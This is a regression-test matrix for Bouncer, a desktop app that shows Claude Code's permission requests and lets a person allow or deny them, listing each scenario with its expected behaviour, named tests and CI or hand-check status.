# Bouncer regression gate

Every scenario Bouncer supports, what must happen, and how it's proven. A PR
isn't ready until every automated row passes in CI (Windows and macOS).

- **Proof:** unit (in-crate `#[test]`), integration (`crates/*/tests`, real
  pipe / socket / binaries), fixture (recorded Claude Code events), frontend
  (`src/*.test.ts`, `npm test`), real-click (the built app on a test instance
  with real input, beside the dev app), hand (needs a person; see the list at
  the end).
- **Test:** each name in backticks is a real test: Rust as `cargo test --
  --list` prints it, frontend as `ts: <its title>`; `windows:` / `macos:`
  mark a test that only exists there. `scripts/check-tests.mjs` fails CI if
  a named test doesn't exist (each OS checks its own).
- **Status:** CI = runs on every PR on Windows and macOS. A date = the last
  real-click pass. Hand N = hand check N below.
- **Brief:** `docs/BRIEF.md` is the plain-English picture of Bouncer. A PR
  that changes behaviour, settings, safety, agents, releases or the roadmap
  updates it in the same docs commit as this file; each release adds its
  line to its Version history.

## Relay and hooks

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| R1 | Every hook event Claude Code sends | Parses; the relay passes it on and prints nothing | integration, fixture | `fixtures_parse_into_events_and_relay_silently` `fixture_names_match_their_recording` `event::tests::parses_tool_event` | CI |
| R2 | Malformed, empty or oversized input | Prints nothing, exits 0 (Claude Code asks as usual) | unit, integration | `malformed_or_huge_input_exits_silent` `tests::rejects_bad_input` `tests::rejects_oversized_input` `tests::strips_utf8_bom` `event::tests::rejects_missing_or_mistyped_fields` `ipc::tests::ignores_garbage` | CI |
| R3 | App not running | The relay exits at once, prints nothing: Claude Code asks in its terminal | integration | `app_closed_exits_fast_and_silent` `prints_nothing_and_exits_zero` | CI |
| R4 | App quits or crashes with a card up | The relay prints nothing at once; Claude Code asks in its terminal | integration | `the_app_going_away_with_a_card_up_prints_nothing` | CI |
| R5 | App hung | Fire-and-forget gives up at 2 s; a request keeps waiting (up to its budget); stdin left open gives up at 2 s | integration | `hung_app_fire_and_forget_gives_up_at_two_seconds` `hung_app_permission_request_keeps_waiting_past_two_seconds` `stdin_left_open_gives_up_at_two_seconds` | CI |
| R6 | Relay killed with its card up (answered in Claude Code's prompt) | The card leaves within a second; nothing is answered; other cards stay | integration, unit | `a_relay_that_goes_away_takes_its_card_with_it` `approvals::tests::a_hang_up_removes_only_its_own_card` | CI |
| R7 | Wait budgets | Card gives up at 100 s, relay at 110 s, Claude Code's hook at 120 s: never killed while waiting | unit | `hooks::tests::the_wait_budgets_nest_inside_the_hook_timeout` `approvals::tests::unanswered_requests_time_out_with_no_answer` | CI |
| R8 | Same user only | Pipe / socket only for this user, checked on both ends; a socket folder others can open is refused | unit, integration | `windows: win::tests::own_process_is_same_user` `macos: refuses_a_folder_others_can_open` `tests::a_second_launch_sees_the_first_one` | CI (the socket test on macOS) |
| R9 | A second Bouncer | A second server on the endpoint is refused; a second launch quits at once, the first keeps working | integration, unit, real-click | `second_server_on_the_same_endpoint_is_refused` `tests::a_second_launch_sees_the_first_one` | CI; real-click 2026-10-08 |
| R10 | A burst of hooks at once (parallel tools) | Every event arrives; a request answers while others stream | integration | `a_burst_of_simultaneous_relays_all_get_through` `many_connections_at_once` `two_sessions_stream_while_one_waits_for_a_decision` | CI |
| R11 | Only permission requests are answered | allow / deny print the documented JSON; other events never print, even if the app says allow | unit, integration | `permission_answers_print_the_documented_json` `other_events_never_print_even_if_the_app_says_allow` `tests::decisions_match_the_documented_shape` `ipc::tests::answers_only_permission_requests` `answers_permission_requests_over_the_endpoint` | CI |
| R12 | Big fields and error text | Tool output, transcript path and a failure's error text never leave the relay | unit | `tests::keeps_event_and_drops_large_fields` `tests::a_failure_never_forwards_its_error_text` | CI |
| R13 | Release builds | Ignore the test overrides (endpoint, rules, away time, autostart key, WebView arguments) | unit (also run in release by CI) | `tests::override_is_honored_only_in_debug_builds` `rules::tests::override_is_honored_only_in_debug_builds` `away::tests::override_is_honored_only_in_debug_builds` `autostart::tests::override_is_honored_only_in_debug_builds` `tests::release_builds_drop_webview_browser_arguments` | CI |
| R14 | Windows paths in events | Reach the island intact | integration | `windows_paths_reach_the_island_intact` | CI |
| R15 | Another agent's hook input without its flag (GitHub Copilot CLI camelCase or VS Code style, other agents' event names, unreadable payloads) | Prints nothing, exits 0 for every event, `preToolUse` included (a crash or non-zero exit there makes Copilot deny); camelCase and unreadable input never reach the app; input with a `timestamp` (Copilot's VS Code style, from a repository's `.claude/settings.json`; Claude Code never sends one) never reaches the app, even one that says allow, Copilot 1.0.105's real inputs included; input with a `cursor_version` (Cursor's CLI runs `~/.claude/settings.json` hooks without their `args`, with its own input and the user's email) never reaches the app either, Cursor 2026.10.22's real inputs included, while `--agent claude-code` still decides by its flag; Claude Code's shape with an unknown event name is only watched, never answered, even if the app says allow or ask | unit, integration | `copilot_camel_case_events_print_nothing_and_never_reach_the_app` `unknown_hook_payloads_print_nothing` `copilot_vs_code_style_events_print_nothing_even_if_answered` `tests::with_no_flag_input_with_a_timestamp_is_refused` `cursor_inputs_without_a_flag_print_nothing_and_never_reach_the_app` `tests::with_no_flag_input_with_cursor_version_is_refused` | CI |
| R16 | Claude Code named on the command line (since v0.11.1) | `install-hooks` writes Claude Code's entry with `args` `--agent claude-code` (Claude Code 2.1.301 passes them, checked by hand); flagged input is always Claude Code's, a `timestamp` included, and gives the same line as before; no arguments (older installs) still work, and only no-flag input with a `timestamp` is refused; other spellings print nothing | unit, integration | `tests::flagged_claude_code_input_is_claude_codes_even_with_a_timestamp` `flagged_claude_code_hooks_work_like_unflagged_ones_and_keep_a_timestamp` `tests::only_no_arguments_or_exactly_agent_codex_run` `hooks::tests::install_adds_one_group_per_event_and_keeps_user_hooks` `hooks::tests::status_tells_installed_incomplete_moved_and_missing` | CI; hand 2026-10-28 (Charan, v0.11.1, Claude Code 2.1.301: a fresh session with the flagged hook showed in the island) |

## Approvals

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| A1 | Allow / Deny with the mouse | One click answers; Claude Code gets allow / deny | integration, real-click | `decisions_from_the_desk_reach_claude_code` | CI; real-click 2026-10-08 |
| A2 | Allow / Deny with the keyboard | Focus starts on Deny, never Allow; Tab wraps inside the island; Enter on Allow never approves, Space on an armed Allow allows; Enter on Deny denies; Esc gives the keyboard back | real-click | (kb check: 8 rows) | real-click 2026-10-08 |
| A3 | The 600 ms arm | Allow is refused before it, by the backend and on screen (a real click at ~260 ms does nothing) | unit, real-click | `approvals::tests::allow_is_refused_before_the_arm_delay` | CI; real-click 2026-10-08 |
| A4 | Two cards in one session; cards from several sessions | Wait in order (FIFO); each answer reaches only its own request; ids are single use | unit | `approvals::tests::two_cards_from_one_session_wait_in_order` `approvals::tests::queue_is_fifo_and_ids_are_single_use` | CI |
| A5 | Yes / No in Claude Code's own prompt with the card up | Card leaves; "answered in terminal", then "allowed in terminal" (its PostToolUse) or "not run" (nothing in 5 s / next prompt); never "denied" | fixture, unit | `approvals::tests::a_no_in_the_terminal_with_the_card_up` `approvals::tests::a_yes_in_the_terminal_with_the_card_up` `approvals::tests::a_long_command_allowed_in_the_terminal_turns_allowed_late` `approvals::tests::two_terminal_answers_in_one_session_settle_separately` `approvals::tests::a_no_in_the_terminal_sends_nothing_more` `approvals::tests::a_yes_in_the_terminal_after_a_timeout_clears_the_wait` | CI |
| A6 | Paused | Requests go to the terminal, nothing queues; waiting cards are released; silent but for the snore | unit, frontend | `approvals::tests::pause_releases_the_queue_and_queues_nothing` `ts: launching paused is silent; pausing snores once, resuming bips once` `ts: nothing else while paused` | CI |
| A7 | Auto-allow by rule | Auto mode answers what a rule allows; Always allow adds the exact offered rule, scoped to the project | unit, integration | `approvals::tests::auto_mode_answers_what_a_rule_allows` `approvals::tests::always_allow_adds_the_offered_rule_then_allows` `check::tests::always_allow_offers_exact_rules_in_this_project` `scoped_rules_match_only_there` | CI |
| A8 | Risky requests | Flagged with a plain reason; never auto-allowed or offered as a rule | unit, integration, fixture | `check::tests::risky_requests_are_never_allowed_or_offered` `bash_case_table` `powershell_case_table` `tool_case_table` `every_risk_reason_is_one_lowercase_clause` `recorded_requests` | CI |
| A9 | Compound or unparseable commands | Never auto-allowed; every part must be allowed | unit, integration | `check::tests::compound_commands_need_every_part_allowed` `fuzz_never_panics_and_never_allows_metacharacters` `powershell_fuzz_only_allows_plain_commands` `shell::tests::compound_commands_split` `shell::tests::issues_are_noticed` | CI |
| A10 | Questions (AskUserQuestion, ExitPlanMode) Bouncer can't show, or while paused | Never answered by Bouncer; no card; the terminal asks; the session shows it waits; one sound. Questions it can show get a card of their own (Q1–Q9) | unit, integration, frontend | `approvals::tests::questions_bouncer_cant_show_go_to_the_terminal_and_flag_the_session` `questions_bouncer_cant_show_print_nothing_so_the_terminal_asks` `ts: a question in the terminal sounds; one that stays doesn't again` | CI |
| A11 | Subagent tools | Another tool finishing in the session doesn't take the card away | unit | `approvals::tests::another_tool_finishing_leaves_the_card_up` | CI |
| A12 | Stale card | The tool ran / failed, or the turn moved on: the card leaves unanswered | unit | `approvals::tests::answering_in_the_terminal_while_the_card_is_up_clears_it` `approvals::tests::a_failure_after_a_terminal_yes_clears_the_card` | CI |
| A13 | Timeout | No answer in 100 s: the card leaves, nothing answered, Claude Code asks | unit | `approvals::tests::unanswered_requests_time_out_with_no_answer` | CI |
| A14 | Left in the terminal | After two quiet minutes: "Waiting in terminal", not spinning | frontend, unit | `ts: a request left in the terminal stops spinning after two quiet minutes` `approvals::tests::a_no_in_the_terminal_sends_nothing_more` | CI |
| A15 | Decision binding | Random 128-bit single-use ids; a replayed or unknown id is refused | unit | `approvals::tests::request_ids_are_unique_128_bit_hex` `approvals::tests::queue_is_fifo_and_ids_are_single_use` | CI |
| A16 | What the card shows | The whole command; hidden characters made visible; edits as a numbered diff | unit | `approvals::tests::request_text_is_whole` `approvals::tests::hostile_text_becomes_visible` `code::tests::hidden_characters_in_code_are_made_visible` `code::tests::edit_becomes_a_numbered_diff` | CI |
| A17 | Observe mode | Only says what it would do; never answers | unit | `approvals::tests::observe_mode_only_says_what_it_would_do` `approvals::tests::always_allow_in_observe_mode_flashes_no_auto_allow` | CI |
| A18 | Projects at the root or home | Never auto-allow | unit, integration | `check::tests::root_or_home_projects_never_allow` `a_project_next_to_the_rules_file` | CI |

## Step icons

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| S1 | Step finished, its PostToolUse came | Green check | frontend, unit | `ts: only a step whose PostToolUse came gets the green check` `approvals::tests::only_a_post_tool_use_marks_a_step_run` | CI |
| S2 | Tool failed | Amber "!", never the check | frontend, unit, fixture | `ts: only a step whose PostToolUse came gets the green check` `approvals::tests::a_failed_tool_tags_its_step` `approvals::tests::recorded_failures_mark_their_step` | CI |
| S3 | You denied | Red cross | frontend, unit | `ts: only a step whose PostToolUse came gets the green check` `approvals::tests::history_records_who_let_each_step_through` | CI |
| S4 | Answered / not run / allowed in terminal | Grey ring / grey dash / green check | frontend, unit | `ts: only a step whose PostToolUse came gets the green check` `approvals::tests::a_yes_in_the_terminal_with_the_card_up` | CI |
| S5 | Finished with neither PostToolUse nor PostToolUseFailure | Neutral grey ring | frontend | `ts: only a step whose PostToolUse came gets the green check` | CI |
| S6 | A long-running step | Three turns, then a still "running" mark (at once under reduced motion) | frontend, real-click | `ts: a long step never looks frozen: the spinner turns, then settles into a still running mark` | CI; real-click 2026-10-08 |
| S7 | Many steps | Repeats grouped; the latest six shown, the rest counted | frontend | `ts: repeated steps group, different outcomes stay apart` `ts: only the latest six are shown, the rest counted` | CI |

## Rules and settings

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| U1 | Each mode (observe, auto) | Observe by default; auto answers only what rules allow | unit | `rules::tests::defaults_parse_in_observe_mode` `approvals::tests::observe_mode_only_says_what_it_would_do` `approvals::tests::auto_mode_answers_what_a_rule_allows` | CI |
| U2 | set_mode | Changes only the mode line (adds it if missing), keeps tables and line endings; refuses a broken file and leaves it; the island shows it | unit | `rules::tests::set_mode_changes_only_the_mode_line` `rules::tests::set_mode_adds_a_missing_line_and_keeps_tables_and_line_endings` `rules::tests::set_mode_refuses_a_broken_file_and_leaves_it` `approvals::tests::set_mode_writes_the_file_and_the_island_shows_it` | CI |
| U3 | Corrupt rules file | Fail safe: observe defaults, the error named by line and shown on the island | unit | `rules::tests::broken_files_fall_back_to_observe_defaults` `rules::tests::strict_parsing_names_the_line` `approvals::tests::a_broken_file_at_start_shows_its_error` `approvals::tests::rule_changes_and_errors_reach_the_island` | CI |
| U4 | Missing rules file | Created with the defaults | unit | `rules::tests::missing_file_is_created_with_defaults` | CI |
| U5 | Rules file others can write | Refused (Windows access list; macOS mode and links) | unit | `rules::tests::access_lists_with_other_writers_are_refused` `windows: rules::tests::own_files_pass_the_windows_access_check` `macos: rules::tests::files_others_can_write_are_refused` | CI |
| U6 | preferences.json corrupt or missing | Defaults, per field; unknown sound names refused | unit, frontend | `prefs::tests::missing_file_gives_defaults_and_save_reads_back` `prefs::tests::unknown_or_broken_values_fall_back_per_field` `prefs::tests::sounds_from_names_refuses_unknown_names` `ts: the pack is exactly the sounds preferences.json knows, in its order` | CI |
| U7 | Wipe history | Settings → Wipe… → confirm: Cancel keeps everything; "Delete history" is armed; then every day file and the summary are deleted, only our files, the pill says so, logging carries on | unit, real-click (page-level) | `activity::tests::old_days_are_deleted_and_wipe_deletes_all` `approvals::tests::coming_back_shows_a_summary_until_closed_and_wipe_empties_it` | CI; real-click 2026-10-08 |
| U9 | One wipe path | Only Settings' armed "Delete history" (after its confirm) wipes; the tray's "Wipe history…" opens that same confirm and never wipes by itself. The one documented exception: uninstall's data box (W7) | unit, frontend, hand | `tests::only_the_confirmed_wipe_command_wipes` `ts: the page wipes only from the armed Delete history after its confirm` `ts: the tray's Wipe history… opens that confirm, never wipes` | CI; Hand 2 passed 2026-10-08 |
| U10 | Settings changes never freeze Bouncer | Size, Sound, Sound style, Volume, Which sounds, the shortcut and Check for updates all go through one `update_prefs`, which holds the preferences lock only to copy and to store (never while making or saving the change); a change that hangs fails the test after 10 s instead of hanging it; no statement in the app takes the same lock twice (the check also flags 0.8.0's `set_prefs`); real clicks on each control: still responding, backend answers, setting saved | unit, real-click | `tests::settings_changes_never_hold_the_preferences_lock` `tests::no_statement_takes_the_same_lock_twice` | CI; real-click 2026-10-16 (PLAN, Settings freeze) |
| U11 | Version in Settings | "Bouncer 0.8.3" (the build's version, from the backend's `about`) at the bottom of Settings, text only | frontend | `ts: settings: the version shows at the bottom of Settings, as text, from the backend` | CI; real-click 2026-10-16 (dev build: "Bouncer 0.0.0"); hand 2026-10-16 (Charan, v0.8.3: "Bouncer 0.8.3"); hand 2026-10-17 (Charan, v0.9.0: "Bouncer 0.9.0"); hand 2026-10-22 (Charan, v0.10.1: "Bouncer 0.10.1"); hand 2026-10-28 (Charan, v0.11.1: "Bouncer 0.11.1"); hand 2026-10-29 (Charan, v0.12.0: "Bouncer 0.12.0"); hand 2026-10-30 (Charan, v0.13.0: "Bouncer 0.13.0"); hand 2026-10-30 (Charan, v0.13.1: "Bouncer 0.13.1"); hand 2026-10-30 (Charan, v0.13.2: "Bouncer 0.13.2") |
| U8 | Rules added one at a time | Appended atomically, read back exactly | unit | `rules::tests::add_appends_one_rule_atomically` `rules::tests::scoped_rules_read_back_exactly` `rules::tests::rules_read_back_from_their_toml` `rules::tests::scoped_rule_keys_are_checked` | CI |

## Redaction and the activity log

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| L1 | Secrets in commands, env, URLs, JSON (escaped quotes included) | Never reach the log file: redacted before write | unit | `redact::tests::every_fake_secret_is_redacted` `activity::tests::no_fake_secret_reaches_the_file` `redact::tests::shapes_are_kept_around_the_mark` `redact::tests::ordinary_text_is_kept` | CI |
| L2 | What the log keeps | Only the listed fields; line counts, never text; a failure only as "failed" | unit | `activity::tests::only_the_listed_fields_are_stored` `activity::tests::edits_log_line_counts_never_their_text` `activity::tests::a_failure_logs_only_that_it_failed` | CI |
| L3 | Log write, read, retention | Day files (UTC), bad lines skipped, a full day stops with a note, old days deleted, shared folders refused | unit | `activity::tests::writes_and_reads_back_skipping_bad_lines` `activity::tests::day_names_are_utc_dates` `activity::tests::a_full_day_stops_logging_with_a_note` `windows: activity::tests::shared_folders_are_refused` `macos: activity::tests::files_are_private_and_shared_folders_refused` `approvals::tests::every_event_and_answer_is_logged` | CI |
| L4 | Away summary | Sums up the span from the (redacted) log; nothing when nothing was done | unit | `away::tests::a_thirty_minute_span_sums_up` `away::tests::nothing_logged_means_no_summary` `away::tests::a_span_with_no_work_means_no_summary` `away::tests::coming_back_after_the_limit_reports_once` `away::tests::a_wait_still_open_lasts_until_now` | CI |
| L5 | Secrets in the live island | Kept unredacted (Charan, 2026-10-08): a card and the session list show the command exactly as sent, so you approve what you see; nothing is written. The log and the away summary stay redacted. | unit | `approvals::tests::request_text_is_whole` | CI (decided 2026-10-08) |

## Sessions

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| N1 | Start, steps, end | Sessions follow their events; the step names the current call; edits carry line counts | unit | `approvals::tests::sessions_follow_events` `approvals::tests::session_steps_describe_the_current_call` `approvals::tests::sessions_carry_the_current_edits_line_counts` | CI |
| N2 | Quiet sessions | Dropped after 30 min idle, 4 h when waiting on the user; never while a card waits | unit | `approvals::tests::quiet_sessions_drop_off` | CI |
| N3 | A crashed session (no SessionEnd) | Drops off, comes back with its next event | unit | `approvals::tests::a_dropped_session_comes_back_with_its_next_event` | CI |

## install-hooks / uninstall-hooks

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| I1 | Install, then uninstall | The user's hooks are kept; uninstall gives back the exact bytes | unit, integration | `hooks::tests::install_adds_one_group_per_event_and_keeps_user_hooks` `hooks::tests::uninstall_restores_the_original_exactly` `install_then_uninstall_is_byte_identical` | CI |
| I2 | Re-install (moved app) | Replaces ours, one per event, with the new path | unit | `hooks::tests::reinstall_from_a_new_place_replaces_ours` | CI |
| I3 | Odd shapes, invalid JSON, bad arguments | Refused; the file is never touched | unit, integration | `hooks::tests::install_refuses_odd_shapes` `invalid_json_is_never_touched` `bad_arguments_fail` | CI |
| I4 | Never silent | Shows the diff, writes nothing without "y", dated backup, atomic write with the same permissions | unit, integration | `nothing_is_written_without_yes` `hooks::tests::diff_shows_changes_with_context` `hooks::tests::write_new_applies_permissions_and_still_writes` `hooks::tests::stamps_utc_dates` | CI |
| I5 | Other files | Only the target and its backup are written | integration | `only_the_target_and_its_backup_are_written` | CI |
| I6 | Lookalike hooks | Uninstall leaves them; only ours count as installed | unit | `hooks::tests::uninstall_leaves_lookalikes_alone` `hooks::tests::installed_sees_only_our_hooks` | CI |
| I7 | Where it writes | `$CLAUDE_CONFIG_DIR/settings.json`, else `~/.claude/settings.json`, or `--settings`; a missing file is created, the relay must exist | unit, integration | `claude_config_dir_is_the_default_target` `hooks::tests::settings_path_follows_claude_config_dir` `install_creates_a_missing_file_and_needs_the_relay` | CI |
| I8 | Hooks status | Installed (every event, this relay, its timeout, Claude Code's with `--agent claude-code`), incomplete (an event missing or an old timeout), another copy (a moved app), update needed (an older Bouncer's entries with no arguments: they work; Re-install brings them up to date), not installed (none of ours; lookalikes don't count) | unit | `hooks::tests::status_tells_installed_incomplete_moved_and_missing` | CI; hand 2026-10-28 (Charan, v0.11.1 installed: "Update needed"; Re-install showed only the `args` change per event; after Write changes, Installed, backup written); hand 2026-10-29 (Charan, v0.12.0 installed: Claude Code hooks Installed); hand 2026-10-30 (Charan, v0.13.0 installed: Claude Code hooks Installed); hand 2026-10-30 (Charan, v0.13.1 installed: Claude Code hooks Installed); hand 2026-10-30 (Charan, v0.13.2: Installed) |
| I9 | Install, re-install, remove from Settings | Each shows the file and the diff first (secrets in its context redacted); Write changes arms after 600 ms (Enter never writes); only the change shown is written, by a single-use id; dated backup, atomic write; a file changed meanwhile or Cancel writes nothing; install then remove gives back the exact bytes | unit, real-click (page-level) | `hooks::tests::plan_then_write_backs_up_and_refuses_a_file_changed_meanwhile` `tests::a_hooks_change_is_written_only_by_its_id_once` `install_then_uninstall_is_byte_identical` | CI; real-click 2026-10-12 |

## The island (UI)

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| UI1 | Three sizes | 100 / 112 / 125%, applied at once; never past 40% of the screen | frontend, real-click | `ts: sizes map to 100 / 112 / 125%, unknown names to the default` `ts: the scale unless the island would pass 40% of the screen, never under 100%` | CI; real-click 2026-10-08 |
| UI2 | Sound on / off, the six default sounds | Off or paused: silence (the snore excepted); six on by default; each under 1 s; alarms stand out | unit, frontend, hand | `prefs::tests::six_sounds_are_on_by_default` `ts: sound off, a sound switched off, or paused: silence (the snore excepted)` `ts: every sound is under 1 s; the wipe under 0.6 s` `ts: alarms stand out in Soft: louder than the rest, buzz kept, harsh top cut` | CI; Hand 1 passed 2026-10-08 |
| UI3 | Reduced motion | No frames, still pose, no greeting, no morph; the running mark at once | frontend, real-click | `ts: the greeting never shows over a card, paused, an open island or with reduced motion` `ts: a card, reduced motion or a re-render of the same size never morphs` | CI; real-click 2026-10-08 |
| UI4 | Motion budget | Short bursts then still; gestures under ~1 s; no CSS animation forever | frontend, real-click | `ts: every mood moves in one short burst, then the loop stops and he holds still` `ts: gestures: one jump, hop or puff under about a second, then still again` `ts: a card's first appearance still gets its pair of hops, then only gestures` | CI; real-click 2026-10-08 |
| UI5 | Keyboard focus ring and Tab order | Ring only while Bouncer has the keyboard; Tab wraps inside the island | real-click | (kb check) | real-click 2026-10-08 |
| UI6 | First clicks | One click works on the pill, ×, gear, a Settings switch, Deny, armed Allow | real-click | (e2e: 12 rows) | real-click 2026-10-08 |
| UI7 | Gear with no sessions | Hover the strip, click the pill, the gear opens Settings | real-click | (ui check) | real-click 2026-10-08 |
| UI8 | Drag | The island moves; the strip and the next layout follow it | real-click, unit | `region::tests::switching_views_at_the_usual_spot_never_moves_the_window` `tests::island_stays_on_screen` | CI; real-click 2026-10-08 |
| UI9 | Launch and the wake strip on several screens | Launch: top centre of the main screen; after a move, the strip is at the top of that screen above where the island was; nothing saved | real-click, unit | `region::tests::the_frame_stays_on_its_screen_and_centred_on_the_box` `tests::reachable_points_need_no_push` | CI; real-click 2026-10-08 |
| UI10 | No white band, no line after a drag | 0 light pixels beside the island after losing the keyboard and after the first drag | real-click | (e2e, ui check) | real-click 2026-10-08 |
| UI11 | Text from agents | textContent only, never parsed as HTML | integration | `frontend_never_parses_strings_as_html` | CI |
| UI12 | CSP and capabilities | Only our script and style; no inline, eval or remote; only our own commands | unit | `tests::strict_csp_and_only_our_commands` | CI |
| UI13 | Window region | Only the box catches clicks; the card's buttons always inside it | unit | `region::tests::the_region_is_only_the_box` `region::tests::the_region_always_holds_the_cards_buttons` `region::tests::the_no_region_switch_works_in_debug_builds_only` | CI |
| UI14 | Fits the screen | Never taller than the work area; the frame fits every view | frontend | `ts: the open island is never taller than the work area` `ts: the frame fits every view and the work area` `ts: fully visible: the viewport holds the whole page, within 2 px` | CI |
| UI15 | Tray menu | Pause / Resume, open, Settings…, Wipe history… (opens Settings' confirm), quit | hand | — | Hand 2 passed 2026-10-08 |
| UI16 | Screen reader | Card, list and Settings read in order with their names | hand, Phase 9 | — | Phase 9 (Narrator check below) |
| UI18 | One click counts, first time, while another window has the keyboard | A card arrives while another window (a terminal) has the keyboard; one click on any control does its job: an option is picked, Send answer / Approve plan / Keep planning / Allow / Deny answer, Explain opens. The island is never rebuilt under a press (a view arriving mid-press is drawn after the click; a press held past 1.5 s stops holding). The keyboard taken by the press stays on the control pressed (never jumps to another option or to Deny); a press on Allow / Send answer / Approve plan sends it nowhere; a card arriving never takes the keyboard by itself | frontend, real-click | `ts: clicks: no rebuild under a press; the newest view is drawn after the release` `ts: clicks: a press that never ends (a drag) stops holding after MAX_HOLD_MS` `ts: clicks: the page holds every view during a press and releases on pointerup, cancel and blur` `ts: clicks: the keyboard taken by a press stays on the control pressed; never jumps to another, never lands on an answer` `ts: clicks: a view drawn after the release is never overwritten by the older one that waited` | CI; real-click 2026-10-16 (PLAN, One click counts); hand 2026-10-16 (Charan, v0.8.2: one click on Blue picked it, ring on it) |
| UI19 | Every click counts the first time (pick, then Send at once) | Send answer, Allow, Approve plan, Add rule and allow, Delete history arm 600 ms from when the card (or confirm) is on screen, once: a pick or any redraw never restarts it, and `fit` replies only after the window holds the card; a button that can't be pressed yet looks it (waiting / arming fill / blocked, no fill) and a press on it shakes it; a refused answer says "Not sent: …" on the card; a view that waited under a press is dropped when a newer one was drawn after the click (0.8.2 drew the stale one: the gear opened Settings and snapped back, 7 of 10). Real-click audit: every card button, the session list, chat, every Settings control, quick after ready and while a redraw lands | frontend, unit, real-click | `ts: arm: counted once from the card being fully visible; a pick never restarts it` `ts: arm: a button that can't be pressed always looks it (blocked: no fill)` `ts: arm: only the card's visibility (and the Explain box, which moves the buttons) sets the arm's start` `ts: arm: a press on a disabled control is shown, and a refused answer says why` `ts: clicks: a view drawn after the release is never overwritten by the older one that waited` `tests::fit_lays_the_window_out_before_it_replies` | CI; real-click 2026-10-16 (PLAN, Every click counts); hand 2026-10-16 (Charan, v0.8.3: pick then Send at once answered first click; the gear opens Settings and it stays) |
| UI20 | Settings hints | Every Settings hint wraps and is shown in full at Small, Medium and Large (never cut with "…"); the Codex hooks hint keeps "Needs Codex 0.145 or newer"; the prototype the same | frontend, real-click | `ts: settings: every hint wraps and is never cut, as the prototype` | CI; real-click 2026-10-21 (test instance, Small / Medium / Large, 12 hints, none cut); hand 2026-10-22 (Charan, installed v0.10.1: at Large the Codex hooks hint reads in full, no hint cut) |
| UI17 | Code pane | Rust / shell highlighting keeps every line exactly | frontend, unit | `ts: pieces always join back to the exact line` `code::tests::write_multiedit_and_bash` `diff::tests::keeps_removes_and_adds_lines` | CI |

## Chat (Phase 6)

The runner (6a) against a fake `claude` (`crates/core/examples/fake_claude.rs`)
and the panel (6b, C17–C31; Markdown, C32–C33).

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| C1 | A prompt with quotes, newlines, backslashes, ` `, shell characters or a fake second JSON line | One stdin line built by `serde_json`; arrives whole and literal as one message; argv never changes | unit, integration | `chat::tests::prompts_are_one_serde_json_line` `a_hostile_prompt_reaches_stdin_as_one_literal_line` | CI |
| C2 | Model choice | Only Default, Haiku, Sonnet, Opus, Fable; anything else refused; Default passes no `--model` | unit | `chat::tests::models_come_from_a_fixed_list` `chat::tests::every_run_has_every_locked_flag` | CI |
| C3 | The `claude` binary | Only a native `claude.exe` / `claude` by full path; `.cmd`, `.ps1`, `.bat`, scripts, folders and other names refused; a missing one named plainly; npm's and the native installer's places searched | unit | `chat::tests::only_native_claude_executables_pass` `chat::tests::a_missing_claude_is_refused_plainly` `chat::tests::candidates_cover_npm_and_the_native_installer` | CI |
| C4 | Cancel | The whole tree dies, grandchildren too; the chat is over | integration | `cancel_kills_the_whole_tree` | CI |
| C5 | Deadlines | No stream event of any kind for 60 s → stopped; a message past 5 min → stopped; status and thinking events count as activity (the tests run one hard-linked fake for the whole run: a fresh copy per test let macOS's slow first launch of a new file eat the 300 ms quiet limit, 4 in 240 runs on CI) | integration | `a_silent_run_is_stopped_after_the_quiet_limit` `a_message_that_runs_too_long_is_stopped` | CI |
| C6 | App quit (the chat dropped) | The whole tree dies | integration | `dropping_a_chat_kills_the_whole_tree` | CI |
| C7 | Garbage, oversized (> 1 MB) lines, unknown events | Skipped; the chat goes on; recorded real runs parse | unit, integration, fixture | `garbage_and_oversized_lines_are_skipped` `chat::tests::recorded_runs_parse_into_events` | CI |
| C8 | Hostile model output | Markup stays text, hidden characters made visible (the page's `textContent`: 6b) | unit | `chat::tests::model_text_keeps_markup_as_text_and_shows_hidden_characters` | CI |
| C9 | Tool results, thinking, subagent text, hooks | Never shown or kept | unit | `chat::tests::tool_results_and_thinking_never_reach_the_page` | CI |
| C10 | The locked flags | Every run has all of them, nothing that weakens them; the fixed read-only line (`--append-system-prompt`, a constant: read-only chat in Bouncer, Read / Grep / Glob in an empty folder, no edits, commands or web) once, unchanged | unit, integration | `chat::tests::every_run_has_every_locked_flag` `a_hostile_prompt_reaches_stdin_as_one_literal_line` | CI |
| C11 | Not on the login, or not locked down | The stream reports an API key source, a tool beyond Read / Grep / Glob, an MCP server or another mode → stopped at once | unit, integration | `chat::tests::a_key_source_or_unlocked_run_stops_it` `a_run_on_an_api_key_or_unlocked_is_stopped` | CI |
| C12 | The child's environment | Every auth, endpoint, provider and billing variable removed by name (`ANTHROPIC_*`, `CLAUDE*`, `AWS_*`, `GOOGLE_*`, Vertex regions); PATH and proxies kept | unit, integration | `chat::tests::auth_endpoint_and_billing_variables_never_reach_the_child` `a_hostile_prompt_reaches_stdin_as_one_literal_line` | CI |
| C13 | A `claude` that rejects a locked flag | "Not supported for chat" with its version; never retried without the flag | integration | `a_rejected_flag_means_unsupported_never_a_retry` | CI |
| C14 | The working folder | Only an empty, private folder; a file in it → refused; nothing written there | unit, integration | `chat::tests::chat_runs_only_in_an_empty_private_folder` `a_chat_never_starts_in_a_folder_with_files` | CI |
| C15 | Errors | Claude Code's own error (a model the plan lacks, max turns) shown as written; a crash shows its exit code and error line | unit, integration | `chat::tests::a_plan_error_is_shown_as_claude_code_wrote_it` `a_crash_shows_its_exit_code_and_error_line` | CI |
| C16 | The real `claude` | Haiku on the login; the C1 prompt is one message; context kept across messages; a read outside the folder denied; it doesn't claim to edit, run commands or use the web; nothing written | integration (ignored; run by hand, see the test) | `real_claude_round_trip` | Local 2026-10-09 (2.1.295, Windows) |
